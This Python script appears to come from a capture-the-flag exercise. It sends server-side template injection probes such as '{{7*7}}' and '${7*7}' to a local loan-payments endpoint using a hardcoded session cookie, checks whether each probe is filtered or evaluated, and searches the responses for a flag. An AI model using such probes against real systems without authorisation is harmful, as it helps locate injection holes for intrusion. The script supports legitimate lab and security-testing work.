import requests
import json
import re
import time

# Configuration
target_url = "http://127.0.0.1:32790/total_loan_payments"
session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVlwig.WglbQAOjrshMUOF4GPSXbG8Pe90"

# Minimal representative techniques
techniques = [
    ("SSTI 101", "{{7*7}}"),
    ("SSTI 102", "${7*7}"),
    ("SSTI 105", "{{ 7*7 }}"),
    ("SSTI 106", "${{7*7}}"),
]

headers = {
    "Content-Type": "application/json",
    "Cookie": f"session={session_cookie}"
}

print("SSTI BYPASS ANALYSIS")
print("=" * 50)
print(f"Target: {target_url}")
print(f"Session: {session_cookie[:40]}...")
print(f"Testing {len(techniques)} techniques\n")

results = []
success_count = 0
blocked_count = 0

for test_name, payload in techniques:
    print(f"[TEST] {test_name}: {payload}")
    print("-" * 40)
    
    test_data = {"amount": payload, "user_input": "test_value"}
    
    try:
        # Use longer timeout and disable keep-alive to prevent connection issues
        response = requests.post(
            target_url,
            headers=headers,
            json=test_data,
            timeout=30,
            allow_redirects=False
        )
        
        status = response.status_code
        response_text = response.text
        content_type = response.headers.get("Content-Type", "")
        
        print(f"Status: {status}")
        print(f"Content-Type: {content_type}")
        print(f"Length: {len(response_text)} bytes")
        
        # Check for filters
        filter_indicators = ["forbidden", "blocked", "access denied", "unauthorized", "invalid"]
        blocked = any(ind in response_text.lower() for ind in filter_indicators)
        
        if blocked:
            matches = [ind for ind in filter_indicators if ind in response_text.lower()]
            print(f"Filter Status: BLOCKED ({matches})")
            blocked_count += 1
        else:
            print(f"Filter Status: PASS")
        
        # Check template execution (7*7 = 49)
        if re.search(r'\b49\b', response_text):
            exact_pos = re.search(r'\b49\b', response_text).start()
            context = response_text[max(0, exact_pos-20):exact_pos+20]
            print(f"Template: ✓ EXECUTED")
            print(f"Context: ...{context}...")
            success_count += 1
        else:
            print(f"Template: ✗ NO EXECUTION")
        
        # Check JSON validity
        is_json = "application/json" in content_type
        try:
            json.loads(response_text)
            json_valid = True
        except:
            json_valid = False
        
        print(f"JSON Response: {'YES' if is_json and json_valid else 'NO'}")
        
        # Preview response
        print(f"Response: {response_text[:200]}{'...' if len(response_text) > 200 else ''}")
        
        results.append({
            "technique": test_name,
            "payload": payload,
            "status": status,
            "blocked": blocked,
            "executed": re.search(r'\b49\b', response_text) is not None,
            "json": is_json and json_valid,
            "response": response_text
        })
        
    except Exception as e:
        print(f"ERROR: {str(e)}")
        results.append({
            "technique": test_name,
            "payload": payload,
            "error": str(e)
        })
    
    print()
    time.sleep(0.5)  # Rate limiting

print("=" * 50)
print("RESULTS SUMMARY")
print("=" * 50)
print(f"Total Tested: {len(techniques)}")
print(f"Successful: {success_count}")
print(f"Blocked: {blocked_count}")

bypasses = [r for r in results if not r.get("blocked") and r.get("executed")]
if bypasses:
    print(f"\n✓ Bypass Found: {len(bypasses)} technique(s)")
    for bp in bypasses:
        print(f"  - {bp['technique']}: Status {bp['status']}")
else:
    print(f"\n✗ No successful bypass")

# Flag check
for r in results:
    flag_match = re.search(r'FLAG\{[^}]+\}', r.get("response", ""))
    if flag_match:
        print(f"\n[!] FLAG: {flag_match.group(0)}")

print("\nTest Complete")
